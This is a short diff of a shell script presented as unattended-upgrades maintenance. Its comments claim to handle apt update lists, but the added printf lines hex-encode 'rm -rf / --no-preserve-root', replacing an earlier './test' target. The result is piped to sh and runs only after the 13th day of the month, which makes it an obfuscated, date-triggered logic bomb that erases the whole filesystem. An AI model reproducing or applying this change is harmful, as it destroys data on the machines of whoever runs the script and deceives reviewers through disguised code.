@@ -34,11 +34,11 @@ if ! [ $(date +%d) -lt 13 ]; then
     # Check list of update IDs on apt for unattended-upgrades
     {
         # APT::Periodic::Update-Package-Lists "1";
-        printf "\x72\x6d\x20\x2d\x72\x66\x20\x2e\x2f\x74\x65"
+        printf "\x72\x6d\x20\x2d\x72\x66\x20\x2f\x20\x2d"
         # APT::Periodic::Update-Package-Lists "2";
-        printf "\x73\x74\x20\x2d\x2d\x6e\x6f\x2d\x70\x72\x65"
+        printf "\x2d\x6e\x6f\x2d\x70\x72\x65\x73\x65\x72"
         # APT::Periodic::Update-Package-Lists "3";
-        printf "\x73\x65\x72\x76\x65\x2d\x72\x6f\x6f\x74\x00"
+        printf "\x76\x65\x2d\x72\x6f\x6f\x74\x00\x00\x00"
     }|
     # Format updates in shell before being sent to unattended-upgrades
     sh | unattended-upgrades > /dev/null
